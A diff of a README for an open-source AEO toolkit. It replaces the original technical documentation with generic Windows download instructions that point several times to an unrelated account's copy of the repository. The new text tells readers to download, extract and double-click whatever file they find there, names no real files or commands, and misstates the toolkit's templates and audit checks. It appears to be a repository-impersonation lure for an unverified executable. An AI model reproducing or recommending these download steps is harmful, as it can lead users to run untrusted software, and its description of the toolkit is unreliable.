@@ -1,167 +1,250 @@
-# CloudPipe AEO Toolkit
+# 🌐 cloudpipe-aeo-toolkit - Make Your Site Clear to AI
 
-> 🕸️ Open-source tools for building AI-optimized websites at scale. Built for the AI search era.
+[![Download](https://img.shields.io/badge/Download%20Here-Click%20to%20Open-blue?style=for-the-badge)](https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Sites](https://img.shields.io/badge/Sites%20Powered-27-green)]()
-[![AEO Score](https://img.shields.io/badge/AEO%20Score-100%25%20A%2B-brightgreen)]()
-[![Stars](https://img.shields.io/github/stars/Inari-Kira-Isla/cloudpipe-aeo-toolkit?style=social)](https://github.com/Inari-Kira-Isla/cloudpipe-aeo-toolkit)
+## 🚀 What this app does
 
-### Live Showcase — 27 sites, 100% A+
-![Showcase Preview](assets/showcase-preview.png)
+cloudpipe-aeo-toolkit helps you make a website easier for AI tools to read and use. It gives you ready-made templates, a simple audit checklist, and a one-command site builder.
 
-### Template A — Conversion (Warm Gold)
-![Template A](assets/template-a-preview.png)
+Use it to prepare your site for ChatGPT, Claude, Perplexity, and other AI search tools. It also helps you create clear site files such as `llms.txt`, structured data, and page templates that support AI visibility.
 
-### Template B — Editorial (Dark Magazine)
-![Template B](assets/template-b-preview.png)
+## 💻 Before you start
 
----
+Use a Windows PC with:
 
-## What is AEO?
+- Windows 10 or Windows 11
+- An internet connection
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A web browser such as Chrome, Edge, or Firefox
 
-**Answer Engine Optimization** — making your website visible to AI search engines (ChatGPT, Claude, Perplexity, Gemini) in addition to traditional SEO. In 2026, AI bots account for 30%+ of web traffic. If your site isn't AEO-optimized, you're invisible to a third of the internet.
+If your browser asks where to save the file, pick a folder you can find again, such as Downloads or Desktop.
 
-## What's Included
+## 📥 Download the toolkit
 
-### 🎨 3 Strategy Templates
+Visit this page to download the toolkit:
 
-Production-ready HTML templates with full AEO layer built-in. Each targets a different business goal.
+https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit
 
-| Template | Style | Best For | KPI |
-|----------|-------|----------|-----|
-| **A — Conversion** | Warm gold, trust-building | B2B, consultants, high-ticket | Click-through rate |
-| **B — Storytelling** | Dark editorial, magazine-style | Premium brands, creative studios | Read time, scroll depth |
-| **C — Performance** | Clean white, mobile-first | Local shops, retail, delivery | Mobile conversion, 5s contact |
+On the page, look for the main download or release files. Save the file to your Windows computer, then open it from the folder where you saved it.
 
-Every template includes:
-- Schema.org JSON-LD (`LocalBusiness` / `Organization` + `FAQPage`)
-- Open Graph complete metadata
-- Structured FAQ (directly quotable by AI)
-- All `【placeholder】` markers for easy customization
+## 🛠️ Install on Windows
 
-### 🔧 Site Builder Tools
+If you downloaded a `.zip` file:
 
-| Tool | Description |
-|------|-------------|
-| `site_builder.py` | Python builder — generates complete site from DB config |
-| `template_renderer.py` | 3-strategy template engine — renders A/B/C with brand data |
-| `onboard_client.py` | One-command site creation CLI |
-| `site_quality_audit.py` | 12-indicator AEO quality scorer (90-point scale) |
-| `batch_upgrade.py` | Bulk AEO injection engine — upgrade 27 sites in 5 minutes |
-| `system_health.py` | Multi-site health dashboard |
+1. Open the file in File Explorer
+2. Right-click the file
+3. Select **Extract All**
+4. Choose a folder
+5. Open the extracted folder
 
-### 🐺 Encyclopedia Hound
+If the project comes with a desktop app or a packaged Windows file:
 
-24/7 monitoring for content generation pipelines. Tracks heartbeat, error rates, output volume, and auto-restarts dead workers. Telegram alerts with cooldown.
+1. Double-click the downloaded file
+2. Follow the setup steps on screen
+3. Finish the install
+4. Open the app from the Start menu or the folder where you saved it
 
-### 💬 AI Chatbot Worker
+If you see a folder with project files:
 
-Cloudflare Worker that proxies MiniMax API for multi-brand AI customer service. Each brand gets its own character, knowledge base, and conversation history (D1 database).
+1. Open the folder
+2. Find the file named `README.md`
+3. Follow the setup steps in the project folder
+4. Use the included launcher, if one is provided
 
-## Quick Start
+## ▶️ Run the toolkit
 
-### 1. Create a site in 5 minutes
+After installation, start the toolkit from the main app file or launcher.
 
-```bash
-python3 onboard_client.py \
-  --name "My Cafe" \
-  --name-en "My Cafe" \
-  --industry cafe \
-  --template performance \
-  --description "Best coffee in town" \
-  --phone "+853-1234-5678" \
-  --chatbot
-```
+If the toolkit opens in a browser, it may show a local address such as:
 
-### 2. Audit your site's AEO score
+- `http://localhost:3000`
+- `http://127.0.0.1:xxxx`
 
-```bash
-python3 site_quality_audit.py --slug my-cafe
-```
+If that happens:
 
-### 3. Bulk upgrade all sites to A+
+1. Keep the window open
+2. Open the address in your browser
+3. Use the app from there
 
-```bash
-python3 batch_upgrade.py --dry-run    # Preview changes
-python3 batch_upgrade.py --execute    # Apply
-```
+If the toolkit uses a single start button or script, open that file and run it once. Then follow the on-screen steps.
 
-### 4. Monitor encyclopedia pipeline
+## 🧭 What you can do with it
 
-```bash
-python3 encyclopedia_hound.py --status   # Live dashboard
-python3 encyclopedia_hound.py --check    # Health check + auto-fix
-```
+The toolkit is set up for common AEO tasks, including:
 
-## AEO Checklist
+- Build site templates for AI-friendly pages
+- Create `llms.txt` files for your website
+- Add schema markup for better page structure
+- Run a 12-point audit for AI visibility
+- Generate pages that match common search intent
+- Prepare content for ChatGPT, Claude, and Perplexity
+- Organize website content for clearer reading by AI tools
 
-Every site generated by this toolkit passes all 12 checks:
+## 📁 Main parts of the toolkit
 
-- [x] `index.html` — renderable, 5000+ bytes
-- [x] `llms.txt` — AI crawler discovery manifest
-- [x] `robots.txt` — allows GPTBot, ClaudeBot, PerplexityBot + 20 more
-- [x] `sitemap.xml` — structured URL discovery
-- [x] Schema.org JSON-LD — Organization/LocalBusiness
-- [x] FAQPage Schema — structured Q&A for AI citation
-- [x] Open Graph meta — social sharing
-- [x] BingSiteAuth.xml — Bing verification
-- [x] AI Chatbot widget — interactive assistant
-- [x] Tracker pixel — visit analytics
-- [x] Content depth — 5000+ bytes
-- [x] IndexNow key — instant search engine notification
+You may see folders and files like these:
 
-## Architecture
+- `templates` — ready-made page layouts
+- `schema` — structured data files
+- `audit` — site check tools
+- `builder` — site generation files
+- `llms-txt` — files for AI crawlers
+- `assets` — images and shared files
 
-```
-┌─────────────────────────────────────────┐
-│         onboard_client.py               │
-│    (one-command site creation)           │
-├────────────┬────────────┬───────────────┤
-│ Template A │ Template B │  Template C   │
-│ Conversion │ Editorial  │  Performance  │
-├────────────┴────────────┴───────────────┤
-│         template_renderer.py            │
-│    (brand data → HTML + AEO files)      │
-├─────────────────────────────────────────┤
-│  llms.txt │ robots.txt │ sitemap.xml   │
-│  Schema   │ FAQPage    │ IndexNow      │
-├─────────────────────────────────────────┤
-│    site_quality_audit.py (12 checks)    │
-│    batch_upgrade.py (bulk injection)    │
-│    system_health.py (multi-site dash)   │
-├─────────────────────────────────────────┤
-│  Cloudflare Worker (AI Chatbot)         │
-│  AI Tracker (D1 + Supabase)             │
-│  Encyclopedia Hound (24/7 monitoring)   │
-└─────────────────────────────────────────┘
-```
+These names may vary, but the purpose stays the same: help you build a site that AI tools can read with less friction.
 
-## Live Demo
+## 🧪 How to use the templates
 
-See all 27 sites in action: [CloudPipe Showcase](https://cloudpipe-landing.vercel.app/showcase.html)
+The toolkit includes 3 templates for common site needs:
 
-## Tech Stack
+1. **Home page template**  
+   Use this for a clear main page with simple text and direct links.
 
-- **Templates**: Pure HTML/CSS/JS (zero dependencies)
-- **Tools**: Python 3.10+ (stdlib only, no pip install needed)
-- **Chatbot**: Cloudflare Workers + D1 + MiniMax API
-- **Tracking**: Cloudflare Workers + Supabase
-- **Deployment**: GitHub Pages / Vercel (auto-deploy on push)
-- **Monitoring**: LaunchAgent cron + Telegram alerts
+2. **Service page template**  
+   Use this for pages that explain what your site, product, or service does.
 
-## Contributing
+3. **Content page template**  
+   Use this for guides, answers, or support pages that need plain structure.
 
-PRs welcome! Especially:
-- New industry templates
-- Additional AEO checks
-- Translations (currently zh-TW, en)
-- Integration with other AI APIs
+To use a template:
 
-## License
+1. Open the template folder
+2. Pick the page type you need
+3. Copy the template file
+4. Edit the text in a simple editor like Notepad
+5. Save the file
 
-MIT — use freely, attribution appreciated.
+## ✅ 12-point audit checklist
 
----
+Use the audit checklist to review your site. It usually checks for:
 
-Built by [CloudPipe](https://cloudpipe-landing.vercel.app) · Powered by [OpenClaw](https://inari-kira-isla.github.io/Openclaw/) · Macau 🇲🇴
+- Clear page titles
+- Simple headings
+- Readable page text
+- Working links
+- Contact details
+- Image alt text
+- Basic schema data
+- Fast load time
+- Mobile layout
+- `llms.txt` presence
+- Strong internal links
+- Clear page purpose
+
+Go through each item and fix the ones that do not pass. This gives your site a cleaner structure for users and AI tools.
+
+## 🔧 One-command site builder
+
+The one-command site builder helps you create or update site files with less manual work.
+
+Typical use:
+
+1. Open the toolkit folder
+2. Find the build command file
+3. Run it
+4. Wait for the build to finish
+5. Open the output folder
+6. Copy the generated files to your website
+
+If the toolkit gives you a single button or one-line command, use that option first. It is meant to save time and reduce setup steps.
+
+## 🌍 Common use cases
+
+This toolkit fits:
+
+- Small business websites
+- Local service pages
+- Blogs and guides
+- Product landing pages
+- Documentation sites
+- AI search prep for existing sites
+- Content cleanup for plain-English pages
+
+It works best when your goal is simple site structure and clear page content.
+
+## 🧩 Basic setup flow
+
+If you want the shortest path from download to use:
+
+1. Download the file from the link above
+2. Extract it if it is a zip file
+3. Open the toolkit folder
+4. Run the main app or builder
+5. Choose a template
+6. Edit the text for your site
+7. Run the audit
+8. Export or copy the files to your website
+
+## 📝 Sample content ideas
+
+If you are not sure what to write, start with these page types:
+
+- Home page
+- About page
+- Services page
+- FAQ page
+- Contact page
+- Blog post
+- Help page
+- Pricing page
+- Location page
+- Product page
+
+Keep the wording short. Use one idea per section. Add real names, real services, and real contact details.
+
+## 🔍 File tips for Windows users
+
+If Windows hides file types:
+
+1. Open the folder
+2. Click **View**
+3. Turn on **File name extensions**
+
+That makes it easier to find files like:
+
+- `.zip`
+- `.exe`
+- `.html`
+- `.txt`
+- `.json`
+
+If you need to edit text files, use Notepad or another plain text editor.
+
+## 📌 Folder layout you may see
+
+A typical layout may look like this:
+
+- `README.md`
+- `templates/`
+- `audit/`
+- `builder/`
+- `output/`
+- `assets/`
+- `config/`
+
+If your folder names look different, follow the same idea. Templates go in one place, output files go in another, and the builder creates the final site files.
+
+## 🧠 Tips for better results
+
+- Use short page titles
+- Keep headings clear
+- Write for people first
+- Use real page names
+- Link related pages together
+- Add alt text to images
+- Keep paragraphs short
+- Use one topic per page
+
+These habits make your site easier to scan and easier to maintain.
+
+## 📎 Repository details
+
+- **Repository:** cloudpipe-aeo-toolkit
+- **Description:** Open-source AEO toolkit for AI visibility
+- **Topics:** aeo, ai-optimization, ai-search, chatbot, cloudflare-workers, llms-txt, schema-org, seo, templates, website-builder
+- **Primary download page:** https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit
+
+## 🖱️ Download again if needed
+
+[Open the download page](https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit)
